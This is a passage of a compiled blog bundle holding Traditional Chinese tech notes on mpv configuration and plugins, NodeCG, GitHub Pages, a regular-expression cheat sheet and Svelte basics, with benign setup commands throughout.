id=\"聲音處理\">聲音處理</h3>\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"http://peterforgacs.github.io/2018/05/20/Audio-normalization-with-ffmpeg/\">Audio Loudness Normalization With FFmpeg</a></p>\n<pre class=\"language-\"><code class=\"language-\"># 音量標準化 [改善背景音過大，人聲過小時的狀況]\n# https://github.com/mpv-player/mpv/issues/3979\n# https://github.com/mpv-player/mpv/issues/6563\n# [解釋] https://superuser.com/questions/323119/how-can-i-normalize-audio-using-ffmpeg\n\n# 下面兩者擇一：\n# af=lavfi=[dynaudnorm=g=5:f=250:r=0.9:p=0.5]\naf = lavfi=[loudnorm=I=-16:TP=-3:LRA=4]\n\n# DYNAUDNORM: https://ffmpeg.org/ffmpeg-filters.html#dynaudnorm\n#\n# 動態音量標準化，這套過濾器會將聲音輸入添增至某一目標大小（例如 0dBFS)。\n# 並在以往\"單純\"的標準化演算法之上，此動態音量標準化會再__動態地__\n# 重新調整聲音輸入的增益係數。使得較為\"安靜\"的部份能獲得更多的增益，\n# 同時讓較為\"響亮\"的部份免於交調失真或削波失真。換句話說，動態音量標準化\n# 可以讓聲音安靜與響亮的部份\"均勻化\"，讓整體聲音有同樣的大小。然而要注\n# 意的是，動態音量標準化__並不會__套用\"動態範圍壓縮\"，聲音檔案的__每個部份__\n# 都會保留 100% 的動態範圍。\n\n# LOUDNORM: https://ffmpeg.org/ffmpeg-filters.html#loudnorm\n#\n# 使用 EBU R128 響度測量進行標準化，有動態標準化與線性標準化模式。\n# 支援 1-pass （可用於串流與檔案） 和 2-pass （僅限檔案） 模式。</code></pre><h3 id=\"youtube-dl-設定\">Youtube-dl 設定</h3>\n<p><code>ytdl-format = bestvideo[ext=mp4][height&lt;=?1080][fps&lt;=?60]+bestaudio/best</code></p>\n<h3 id=\"使用獨立的-youtube-dl-檔案觀看直播串流影片\">使用獨立的 youtube-dl 檔案觀看直播串流影片</h3>\n<p><code>youtube-dl.exe -o - {%youtube url%} | mpv -</code></p>\n<h2 id=\"外掛套件\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/mpv-player/mpv/wiki/User-Scripts\">外掛套件</a></h2>\n<p>mpv 可以使用 lua 語言撰寫第三方套件，套件檔案通常放置於 <code>~/.config/mpv/scripts/</code>。</p>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/mpv-player/mpv/blob/master/TOOLS/lua/autoload.lua\">autoload</a></td>\n<td>播放檔案後會自動讀取同資料夾內的其它檔案並加入播放清單內。</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/huisedenanhai/LoadDanmaku\">loaddanmaku</a></td>\n<td>讀取資料夾內的 <code>.xml</code> Nico 留言檔案。</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://gist.github.com/ChrisK2/8701184fe3ea7701c9cc\">ls_hook.lua</a></td>\n<td>可使用 <a target=\"_blank\" rel=\"nofollow\" href=\"http://docs.livestreamer.io/#\">livestreamer</a> 觀看直播串流。</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/Akemi/mpv-oled-screensaver\">mpv-oled-screensaver</a></td>\n<td>保護 OLED 避免烙痕效應，在影片暫停 15 秒後會自動轉為黑畫面。</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/rossy/mpv-open-file-dialog\">open-file-dialog.lua</a></td>\n<td>可使用快捷鍵 <code>Ctrl+O</code> 從程式內直接開啟檔案視窗選擇影片播放</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/4e6/mpv-reload\">reload.lua</a></td>\n<td>播放線上影片緩衝過久時，可以自行重新載入。</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/Eisa01/mpv-scripts#smartcopypaste-script\">SmartCopyPaste Script</a></td>\n<td>可以直接使用 <code>Ctrl+V</code> 將檔案路徑或網址貼至 mpv 播放。</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://gist.github.com/voltmtr/8b4404b4e23129b226b9e64863d3e28b\">LumaSharpenHook.glsl</a></td>\n<td>使用取自知名的遊戲特效增強器 SweetFX 裡的銳利化濾鏡。<br /> 在設定檔案內加入 <code>vo=opengl-hq:user-shaders=&quot;~/config_directory/LumaSharpenHook.glsl&quot;</code></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/ekisu/mpv-webm\">mpv-webm</a></td>\n<td></td>\n</tr>\n</tbody></table>\n<h2 id=\"外部連結\">外部連結</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://wiki.archlinux.org/index.php/Mpv\">Archlinux Wiki - mpv</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/mpv-player/mpv/blob/master/DOCS/man/lua.rst\">https://github.com/mpv-player/mpv/blob/master/DOCS/man/lua.rst</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/mpv-player/mpv/wiki/User-Scripts\">https://github.com/mpv-player/mpv/wiki/User-Scripts</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://top.gg/bot/538781926132023306\">https://top.gg/bot/538781926132023306</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/juvian/discord-image-dupe\">https://github.com/juvian/discord-image-dupe</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://gitlab.com/Kwoth/nadekobot/issues?sort=relative_position&amp;state=closed\">https://gitlab.com/Kwoth/nadekobot/issues?sort=relative_position&amp;state=closed</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/po5/mpv_irc/blob/master/irc.lua\">https://github.com/po5/mpv_irc/blob/master/irc.lua</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/rossy/mpv-repl\">https://github.com/rossy/mpv-repl</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/noaione/mpv-discordRPC/blob/master/Scripts/mpv-drpc.lua\">https://github.com/noaione/mpv-discordRPC/blob/master/Scripts/mpv-drpc.lua</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/Samillion/mpv-ytdlautoformat\">https://github.com/Samillion/mpv-ytdlautoformat</a></li>\n</ul>\n<h2 id=\"追伸\">追伸</h2>\n<p>把 NicoNico 動畫的留言轉換成可在播放器上觀看的字幕檔案。</p>\n<h3 id=\"下載留言\">下載留言</h3>\n<ol>\n<li>下載並開啟 <a target=\"_blank\" rel=\"nofollow\" href=\"http://xenog.web.fc2.com/\">NicomentXenoglossia</a>。</li>\n<li>(推薦) 點擊右上角左邊第一個選項監控剪貼簿。</li>\n<li><code>詳細設定</code> -&gt; <code>DL の挙動（コメント／情報）</code>-&gt; 取消勾選 <code>ダウンロードしたコメントファイルには BoonSutazioData を追加する</code></li>\n<li>在下方的 <code>ダウンロードするもの</code> 只勾選 <code>コメントファイル</code> 。</li>\n<li>於輸入欄貼上網址並按下 Enter 鍵將影片加入下載清單，點選 <code>ダウンロード</code> 開始下載。</li>\n</ol>\n<h3 id=\"轉換留言\">轉換留言</h3>\n<ol>\n<li>安裝 <a target=\"_blank\" rel=\"nofollow\" href=\"https://www.python.org/download/releases/3.0/\">Python 3</a></li>\n<li>下載 <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/m13253/danmaku2ass\">danmaku2ass</a></li>\n<li>依照文件範例使用命令列呼叫轉換指令\n範例：<code>danmaku2ass.py -s 1920x1080 -fn &quot;MS PGothic&quot; -fs 48 -a 0.8 -dm 5 -ds 5 input.xml -o output.ass</code></li>\n<li>(推薦) 新增批次檔快速進行處理\n<code>danmaku2ass.py -s 1920x1080 -fn &quot;Noto Sans&quot; -fs 80 -a 0.95 -dm 5 -ds 5 %1 -o %~n1.ass</code></li>\n<li>完成。</li>\n</ol>\n<h3 id=\"直接讓播放器讀取-xml-檔案\">直接讓播放器讀取 <code>.xml</code> 檔案</h3>\n<p>挫折。</p>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/huisedenanhai/LoadDanmaku\">loaddanmaku</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.dennogumi.org/2019/01/hack-of-the-day-extracting-comments-from-nicovideo/\">Hack of the day: extracting comments from Nicovideo</a></li>\n</ul>\n","date":"2019-07-19T15:18:13.000Z","excerpt":"","printDate":"July 19, 2019","printReadingTime":"3 min read"};

var route_79 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod67
});

var Mod68 = {"title":"使用 NODECG 妝點直播介面","slug":"nodecg","html":"<h2 id=\"介紹\">介紹</h2>\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://nodecg.com/\">NodeCG</a> 是為了直播所設計的介面框架，提供使用者能使用網頁撰寫動態與複雜的直播介面設計，透過操作快速修改介面內容。</p>\n<p>範例：</p>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/gamesdonequick/sgdq18-layouts\">SGDQ2018-Layouts</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/RTAinJapan/rtainjapan-layouts\">RTA in Japan-Layouts</a></li>\n</ul>\n<h2 id=\"安裝\">安裝</h2>\n<h3 id=\"前置需求\">前置需求</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://nodejs.org/\">Node.js</a></li>\n<li>npm (已於 Node.js 0.6.3 版後內建)</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://git-scm.com/downloads\">git</a></li>\n</ul>\n<h3 id=\"建立網站\">建立網站</h3>\n<pre class=\"language-bash\"><code class=\"language-bash\">git clone https://github.com/nodecg/nodecg.git\ncd nodecg\nnpm install --production\nnode index.js</code></pre><p>可於 <a target=\"_blank\" rel=\"nofollow\" href=\"https://nodecg.com/tutorial-6_nodecg-configuration.html\"><code>cfg/nodecg.json</code></a> 修改設定。</p>\n<h3 id=\"安裝-bundle\">安裝 Bundle</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/nodecg/awesome-nodecg/blob/master/README.md\">awesome-nodecg</a></li>\n</ul>\n<ol>\n<li>使用 <code>nodecg-cli</code> 安裝</li>\n</ol>\n<pre class=\"language-bash\"><code class=\"language-bash\">npm install --global nodecg-cli\nnodecg install lange/lange-notify</code></pre><ol start=\"2\">\n<li>安裝來自 Bitbucket 的 Bundle</li>\n</ol>\n<p><code>nodecg install bitbucket:username/repo-name</code></p>\n<ol start=\"3\">\n<li>安裝來自其它 git 提供者的 Bundle</li>\n</ol>\n<p><code>nodecg install https://gitlab.com/username/repo-name.git</code></p>\n<h3 id=\"自製-bundle\">自製 Bundle</h3>\n<ol>\n<li>安裝 <code>Yeoman</code> (網站樣板頁面工具) 和 <code>generator-nodecg</code> (快速產生 NodeCG 樣板檔案)</li>\n</ol>\n<pre class=\"language-bash\"><code class=\"language-bash\">npm install --global yo generator-nodecg\ncd bundles\nmkdir my-first-bundle\ncd my-first-bundle\nyo nodecg</code></pre><p>亦可指定產生特定類型的樣版頁面</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">yo nodecg:panel\nyo nodecg:graphic\nyo nodecg:extension</code></pre><ol start=\"2\">\n<li>開啟 <code>nodecg/bundles/bundle-sample/dashboard/panel.html</code> 修改 Panel 頁面</li>\n<li>開啟 <code>nodecg/bundles/bundle-sample/extension.js</code> 修改 JS</li>\n<li>開啟 <code>nodecg/bundles/bundle-sample/graphics/index.html</code> 修改 Layout 頁面</li>\n</ol>\n","date":"2019-11-13T08:48:54.000Z","excerpt":"","printDate":"November 13, 2019","printReadingTime":"1 min read"};

var route_76 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod68
});

var Mod69 = {"title":"推送網頁到 GitHub Pages","slug":"push-page-to-github","html":"<h2 id=\"前置準備\">前置準備</h2>\n<ul>\n<li>Github 帳號</li>\n<li>理解版本控管</li>\n</ul>\n<h2 id=\"步驟\">步驟</h2>\n<ol>\n<li>登入 <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/\">Github</a>，點選右上角 <code>+</code> -&gt; <code>New repository</code></li>\n<li>將 <code>Repository name</code> 命名為 <code>[你的 github 帳號].github.io</code> -&gt; <code>Create Repositorty</code></li>\n<li>開啟 Terminal，clone 專案至本地端: <code>git clone https://github.com/[你的帳號]/[你的帳號].github.io.git</code></li>\n<li>開啟編輯器，建立檔案後 commit: <code>git add .</code>，push: <code>git push</code>，完成</li>\n</ol>\n<h2 id=\"新增子專案\">新增子專案</h2>\n<h3 id=\"1-子資料夾方式\">1. 子資料夾方式</h3>\n<ol>\n<li>直接在 <code>[你的帳號].github.io</code> 裡新增子專案目錄</li>\n<li>push 上去後，就可從 <code>https://[你的帳號].github.io/[子專案]</code> 存取子專案網頁</li>\n</ol>\n<p>這種方式的缺點是會造成主專案目錄過度龐大且混亂，建議使用獨立專案方式</p>\n<h3 id=\"2-獨立專案方式\">2. 獨立專案方式</h3>\n<ol>\n<li>登入 <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/new\">Github</a> 新增專案</li>\n<li>clone 專案</li>\n<li>建立 <code>gh-pages</code> branch: <code>git checkout -b gh-pages</code></li>\n<li>push，完成</li>\n</ol>\n<h3 id=\"其它\">其它</h3>\n<p>當同時存在子資料夾與獨立專案的同名專案時，會以獨立專案的分支內容為主</p>\n","date":"2020-05-25T00:26:32.000Z","excerpt":"","printDate":"May 25, 2020","printReadingTime":"1 min read"};

var route_45 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod69
});

var Mod70 = {"title":"React 筆記","slug":"react","html":"<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/naruto/items/fdb61bc743395f8d8faf\">React を使うとなぜ jQuery が要らなくなるのか - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://chakra-ui.com/\">Chakra UI | Design System built with React</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/daiend/items/9b7f2eada88ad0dd7c5c\">【React Native】アプリ開発未経験のフロントエンドエンジニアが ToDo リストを作ってみる - Qiita</a></li>\n</ul>\n","date":"2020-06-10T14:58:30.000Z","excerpt":"","printDate":"June 10, 2020","printReadingTime":"1 min read"};

var route_78 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod70
});

var Mod71 = {"title":"Regular Expression","slug":"regular-expression","html":"<h2 id=\"相關工具\">相關工具</h2>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://regex101.com/\">Regex101</a></td>\n<td>驗證內容是否符合表達式</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://jex.im/regulex/#!flags=&amp;re=%5E(a%7Cb)*%3F%24\">Regulex</a></td>\n<td>圖象化表達式內容</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://ihateregex.io/\">iHateRegex</a></td>\n<td>表達式 snippet</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://regexcrossword.com/\">Regex Crossword</a></td>\n<td>正規表達式字謎遊戲</td>\n</tr>\n</tbody></table>\n<h3 id=\"指定字元\">指定字元</h3>\n<table>\n<thead>\n<tr>\n<th>記述</th>\n<th>內容</th>\n<th>範例</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>.</code></td>\n<td>任意字元</td>\n<td><code>.n</code></td>\n</tr>\n<tr>\n<td><code>[]</code></td>\n<td>指定之字元</td>\n<td><code>[aeiou]</code></td>\n</tr>\n<tr>\n<td><code>-</code></td>\n<td>範圍內字元</td>\n<td><code>[a-zA-Z]</code></td>\n</tr>\n<tr>\n<td><code>^</code></td>\n<td>排除字元</td>\n<td><code>[^a]</code></td>\n</tr>\n</tbody></table>\n<h3 id=\"字元次數\">字元次數</h3>\n<table>\n<thead>\n<tr>\n<th>記述</th>\n<th>內容</th>\n<th>範例</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>*</code></td>\n<td>任意數量</td>\n<td><code>bo*</code></td>\n</tr>\n<tr>\n<td><code>+</code></td>\n<td>至少一個</td>\n<td><code>a+</code></td>\n</tr>\n<tr>\n<td><code>?</code></td>\n<td>零或一個</td>\n<td><code>e?le?</code></td>\n</tr>\n<tr>\n<td><code>{次數}</code></td>\n<td>指定數量</td>\n<td><code>a{2}</code></td>\n</tr>\n<tr>\n<td><code>{下限, 上限}</code></td>\n<td>指定範圍</td>\n<td><code>a{1,3}</code></td>\n</tr>\n</tbody></table>\n<h3 id=\"字元位置\">字元位置</h3>\n<table>\n<thead>\n<tr>\n<th>記述</th>\n<th>內容</th>\n<th>範例</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>^</code></td>\n<td>以此開頭</td>\n<td><code>^A</code></td>\n</tr>\n<tr>\n<td><code>$</code></td>\n<td>以此結尾</td>\n<td><code>t$</code></td>\n</tr>\n</tbody></table>\n<h3 id=\"特殊字元\">特殊字元</h3>\n<p>正規表達式有一系列代表指定範圍的特殊記述：</p>\n<table>\n<thead>\n<tr>\n<th>記述</th>\n<th>內容</th>\n<th>等同</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>\\d</code></td>\n<td>吻合數字</td>\n<td><code>[0-9]</code></td>\n</tr>\n<tr>\n<td><code>\\w</code></td>\n<td>吻合文數字與底線字元 (_)</td>\n<td><code>[A-Za-z0-9_]</code></td>\n</tr>\n<tr>\n<td><code>\\s</code></td>\n<td>吻合 space 字元</td>\n<td><code>[\\n\\r\\t]</code></td>\n</tr>\n<tr>\n<td><code>\\D</code></td>\n<td>排除數字</td>\n<td></td>\n</tr>\n<tr>\n<td><code>\\W</code></td>\n<td>排除文數字</td>\n<td></td>\n</tr>\n<tr>\n<td><code>\\S</code></td>\n<td>排除 space 類型字元</td>\n<td></td>\n</tr>\n<tr>\n<td><code>\\n</code></td>\n<td>吻合換行符號</td>\n<td></td>\n</tr>\n<tr>\n<td><code>\\r</code></td>\n<td>吻合 carriage return</td>\n<td></td>\n</tr>\n<tr>\n<td><code>\\t</code></td>\n<td>吻合定位字元 (tab)</td>\n<td></td>\n</tr>\n<tr>\n<td><code>\\v</code></td>\n<td>吻合垂直定位字元 (vertical tab)</td>\n<td></td>\n</tr>\n</tbody></table>\n<p>除此之外，<code>[\\$.|?*+( )</code> 這些特殊字元都需要在前面加上 <code>\\</code> ，避開它原有的特殊意義，如：<code>\\$</code>、<code>\\*</code>。</p>\n<h3 id=\"常用範例\">常用範例</h3>\n<ul>\n<li>西元生日: <code>/^[1-9]\\d{3}-\\d{2}-\\d{2}$/</code></li>\n<li>身分證字號: <code>/^[A-Z]\\d{9}$/</code></li>\n<li>Gmail 信箱: <code>/^\\w+@gmail.com$/</code></li>\n<li>四則運算式: <code>/^[\\d+-*\\/]*$/</code></li>\n</ul>\n<h2 id=\"在-vscode-上使用正規表達式快速處理文字\">在 VSCode 上使用正規表達式快速處理文字</h2>\n<p>在 VSCode 的搜尋功能內使用正規表達式符號時，\n需啟用正規表達式搜尋功能 (快捷鍵為 <code>Alt+R</code> )，\n不需在前後加上 <code>\\\\</code>，\n可以用 <code>Alt + Enter</code> 一次選取所有符合規則的字元。</p>\n","date":"2019-09-17T20:08:26.000Z","excerpt":"","printDate":"September 17, 2019","printReadingTime":"2 min read"};

var route_46 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod71
});

var Mod72 = {"title":"Svelte 筆記","slug":"svelte","html":"<h2 id=\"what-is-svelte？\">What is Svelte？</h2>\n<ul>\n<li>Svelte 是套秉持「Write less code」的精神，為了建構 UI 而生的<strong>編譯器</strong></li>\n<li>不同於 Vue 和 React 這類框架是在瀏覽器上執行處理，Svelte 是先在編譯階段就完成建構</li>\n<li>Svelte 不採用 Virtual DOM diff，而是用原生 JS 直接修改 DOM</li>\n<li>擁有相對優秀的執行速度與檔案大小表現</li>\n</ul>\n<h2 id=\"安裝\">安裝</h2>\n<h3 id=\"前置需求\">前置需求</h3>\n<ul>\n<li>Node.js</li>\n<li>npm</li>\n</ul>\n<h3 id=\"下載樣板\">下載樣板</h3>\n<pre class=\"language-bash\"><code class=\"language-bash\">npx degit sveltejs/template svelte-app\ncd svelte-app\nnpm install</code></pre><ul>\n<li><code>npx</code> 是 npm 在 v5.2.0 之後內建的指令，提供暫時性執行某個 npm 套件的功能</li>\n<li><code>degit</code> 是一套能供使用者直接取用現存 project 樣板的套件</li>\n</ul>\n<h2 id=\"基礎語法\">基礎語法</h2>\n<ul>\n<li>svelte 與其它框架相同，使用獨有的 <code>.svelte</code> 副檔名撰寫</li>\n<li>每個檔案為獨立的 component，包含 Javascript、CSS 和 HTML\n│ JS 和 CSS 分別寫在 <code>&lt;script&gt;&lt;/script&gt;</code>、<code>&lt;style&gt;&lt;/style&gt;</code>\n└ HTML 則直接撰寫於下方</li>\n</ul>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n  <span class=\"token comment\">/* js gones here */</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\">\n  <span class=\"token comment\">/* styles goes here */</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token comment\">&lt;!-- markup (zero or more items) goes here --></span></code></pre><ul>\n<li>變數可直接於 <code>&lt;script&gt;</code> 中常規宣告，並使用 <code>{}</code> 代入／顯示變數\n└ 於屬性的雙括號中亦可使用：<code>&lt;p class=&quot;primary-{bar}&quot;&gt;Some text&lt;/p&gt;</code></li>\n<li>與屬性同名的變數\n│ 如 <code>&lt;img src={src} alt=&quot;A man dances.&quot;&gt;</code>\n└ 可省略成 <code>&lt;img {src} alt=&quot;A man dances.&quot;&gt;</code></li>\n<li>匯入 component 亦同樣於 <code>&lt;script&gt;</code> 中直接引入即可使用\n└ <code>import Nested from &#39;./Nested.svelte&#39;;</code></li>\n<li>CSS 樣式作用域僅該 component\n└ svelte 會自動用 hash 命名，因此不用擔心命名衝突</li>\n</ul>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">import</span> App <span class=\"token keyword\">from</span> <span class=\"token string\">\"./App.svelte\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">const</span> app <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">App</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  target<span class=\"token operator\">:</span> document<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">,</span>\n  props<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// we'll learn about props later</span>\n    answer<span class=\"token operator\">:</span> <span class=\"token number\">42</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token operator\">&lt;</span>App <span class=\"token operator\">/</span><span class=\"token operator\">></span><span class=\"token punctuation\">;</span></code></pre><ul>\n<li>svelte 可使用 <code>@html</code> 從 JS 中傳入 HTML 內容進行渲染\n├ ex. <code>&lt;p&gt;{@html string}&lt;/p&gt;</code>\n│ 但 svelte 並沒有進行任何過濾處理，會有 XSS 攻擊的風險\n└ 需確保此內容來自可信任的來源</li>\n</ul>\n<h2 id=\"reactivity\">Reactivity</h2>\n<ul>\n<li>Reactivity 意指指派值時會觸發此行為，類似 Vue 的 <code>computed</code></li>\n<li>svelte 提供了 reactivit 宣告：<code>$:</code>\n├ component 的狀態改變時，會自動更新 <code>$:</code> 後面的內容到 DOM 上\n│ ex. <code>$: doubled = count * 2;</code>\n│ 這時 <code>$:</code> 後面便不需再加上 <code>let</code> 之類的變數宣告\n├ <code>$:</code> 之後亦可使用如 <code>console.log()</code> 之類的函式監看數值變化\n│ 但 reactivity 只會於賦值時觸發\n│ 如 Array 的 <code>push</code> 和 <code>splice</code> 並不會觸發更新\n│ 因此 <code>push</code> 要改寫成 <code>numbers = [...numbers, numbers.length + 1];</code>\n└ 並且賦值變數必須為所更新的變數，例如二段式的<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> foo <span class=\"token operator\">=</span> obj<span class=\"token punctuation\">.</span>foo<span class=\"token punctuation\">;</span>\nfoo<span class=\"token punctuation\">.</span>bar <span class=\"token operator\">=</span> <span class=\"token string\">\"baz\"</span><span class=\"token punctuation\">;</span></code></pre>並不會有任何效果，除非在最後再加上 <code>obj=obj</code></li>\n</ul>\n<h3 id=\"reactivity-搭配非同步處理\">Reactivity 搭配非同步處理</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/sveltejs/svelte/issues/2118\">Async reactive declarations · Issue #2118 · sveltejs/svelte</a></li>\n</ul>\n<h4 id=\"reactive-statements\">Reactive Statements</h4>\n<pre class=\"language-svelte\"><code class=\"language-svelte\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n<span class=\"token keyword\">let</span> package_name <span class=\"token operator\">=</span> <span class=\"token string\">'svelte'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">let</span> download_count <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n$<span class=\"token operator\">:</span> <span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span><span class=\"token string\">'https://api.npmjs.org/downloads/point/last-week/'</span> <span class=\"token operator\">+</span> package_name<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">response</span> <span class=\"token operator\">=></span> response<span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span> <span class=\"token operator\">=></span> download_count <span class=\"token operator\">=</span> data<span class=\"token punctuation\">.</span>downloads <span class=\"token operator\">||</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// Updating `package_name` will asynchronously update `download_count`</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n</code></pre><h4 id=\"derived-stores\">Derived Stores</h4>\n<pre class=\"language-svelte\"><code class=\"language-svelte\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> writable<span class=\"token punctuation\">,</span> derived <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'svelte/store'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">const</span> package_name <span class=\"token operator\">=</span> <span class=\"token function\">writable</span><span class=\"token punctuation\">(</span><span class=\"token string\">'svelte'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> download_count <span class=\"token operator\">=</span> <span class=\"token function\">derived</span><span class=\"token punctuation\">(</span>\n    package_name<span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">(</span><span class=\"token parameter\">$package_name<span class=\"token punctuation\">,</span> set</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span><span class=\"token string\">'https://api.npmjs.org/downloads/point/last-week/'</span> <span class=\"token operator\">+</span> $package_name<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">response</span> <span class=\"token operator\">=></span> response<span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span> <span class=\"token operator\">=></span> <span class=\"token function\">set</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>downloads<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n            <span class=\"token comment\">// We override the `set` function to eliminate race conditions</span>\n            <span class=\"token comment\">// This does *not* 